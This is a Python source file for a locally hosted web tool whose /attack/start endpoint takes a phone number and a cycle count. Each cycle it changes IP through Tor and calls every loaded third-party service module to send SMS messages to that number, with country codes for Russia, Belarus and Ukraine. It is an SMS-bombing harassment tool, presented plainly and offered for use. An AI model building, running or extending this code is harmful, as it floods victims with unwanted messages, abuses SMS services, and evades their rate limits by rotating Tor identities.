import inspect
import logging
import os
import re
import subprocess
import sys
import traceback
import webbrowser
import time
from collections import deque
import aiohttp.client_exceptions
import click
import phonenumbers
import pkg_resources
from aiohttp import web
import asyncio

import config 

# for static values in class Service
from services.service import Service

COUNTRY_CODES = {"7": "ru", "375": "by", "380": "ua"}

API_REQUIRED_PARAMS = ["number_of_cycles", "phone_code", "phone"]

app = web.Application()
routes = web.RouteTableDef()


current = deque()
def coroutine_start(run, *args, **kwargs):
    coro = run(*args, **kwargs)
    current.append(coro)
    coro.send(None)

# @click.option('--password', default=TOR_PASSWORD)
# @click.option("--phonecode", default='ru')
# @click.option("--phonenumber")
# @click.option("--number_iteration", default=100)
@click.command()
@click.option("--ip", default="127.0.0.1")
@click.option("--port", default="8080")
@click.option("--password", default=config.TOR_PASSWORD)
def main(ip: str, port: int, password: str):
    logging.basicConfig(
        format='%(levelname)s\t\t%(asctime)s: %(name)s - %(message)s',
        level=logging.DEBUG
    )
    config.TOR_PASSWORD = password
    # loop = asyncio.get_event_loop()
    # loop.run_until_complete(attack(number_iteration, COUNTRY_CODES[phonecode], phonenumber, TOR_PASSWORD))

    app.add_routes(routes)
    app.add_routes([web.static("/static", "static")])
    open_url(f"http://{ip}:{port}/")
    web.run_app(app, host=ip, port=port)


def load_services():
    services = os.listdir("services")
    sys.path.insert(0, "services")
    service_classes = {}

    for service in services:
        if service.endswith(".py") and service != "service.py":
            module = __import__(service[:-3])
            for member in inspect.getmembers(module, inspect.isclass):
                if member[1].__module__ == module.__name__:
                    service_classes[module] = member[0]

    return service_classes

def change_ip(password):
    logger = logging.getLogger('change_ip')
    try:
        logger.debug(f"wait {Service.wait_new_ip} seconds for new ip")
        time.sleep(Service.wait_new_ip)
        Service.renew_connection(password)
        logger.debug("get new ip")
    except Exception as exp:
        raise exp


async def attack(number_of_cycles: int, phone_code: str, phone: str):
    for _ in range(number_of_cycles):
        change_ip(config.TOR_PASSWORD)
        for module, service in load_services().items():
            classService = getattr(module, service)
            logger = logging.getLogger(classService.__name__)
            try:
                # await classService(phone, phone_code).run()
                await classService(phone, phone_code).run()
                logger.info("send sms")
            except aiohttp.client_exceptions.ClientError as exp:
                logger.error(exp)
            except Exception as exp:
                logger.error(exp)
                raise exp

def open_url(url: str):
    try:
        if "ANDROID_DATA" in os.environ:  # If device is running Termux
            subprocess.run(
                ["am", "start", "--user", "0", "-a", "android.intent.action.VIEW", "-d", url,],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
    except FileNotFoundError:
        pass
    webbrowser.open(url, new=2, autoraise=True)

@routes.get("/")
async def index(_):
    with open("templates/index.html", encoding="utf-8") as template:
        services_count = str(len(load_services()))
        response = template.read().replace("services_count", services_count)
        return web.Response(text=response, content_type="text/html")


@routes.post("/attack/start")
async def start_attack(request):
    try:
        data = await request.post()
        if len(data.items()) == 0:
            data = await request.json()

        for required_param in API_REQUIRED_PARAMS:
            if required_param not in data:
                return web.json_response(
                    {
                        "success": False,
                        "error_code": 400,
                        "error_description": f"You need to specify {required_param}.",
                    },
                    status=400,
                )
        phone = re.sub("[^0-9]", "", data["phone"])

        number_of_cycles = int(data["number_of_cycles"])
        if int(number_of_cycles) < 1:
            return web.json_response(
                {
                    "success": False,
                    "error_code": 400,
                    "error_description": "The minimum value for number_of_cycles is 1.",
                },
                status=400,
            )
######################################################
        phone_code = data["phone_code"]
        if phone_code == "":
            phone_code = str(phonenumbers.parse("+" + phone).country_code)
        elif phone_code not in COUNTRY_CODES.keys():
            return web.json_response(
                {
                    "success": False,
                    "error_code": 400,
                    "error_description": "This phone_code is not supported.",
                },
                status=400,
            )
        await attack(number_of_cycles, phone_code, phone)
        return web.json_response({"success": True})
    except Exception as error:
        formatted_error = f"{type(error).__name__}: {error}"
        return web.json_response(
            {
                "success": False,
                "error_code": 500,
                "error_description": formatted_error,
                "traceback": traceback.format_exc(),
            },
            status=500,
        )

if __name__ == "__main__":
    main()
    # coroutine_start(
    #     main, config.TOR_PASSWORD,
    #     config.COUNTRY_CODE, config.PHONENUMBER,
    #     config.NUMBER_ITERATION
    # )

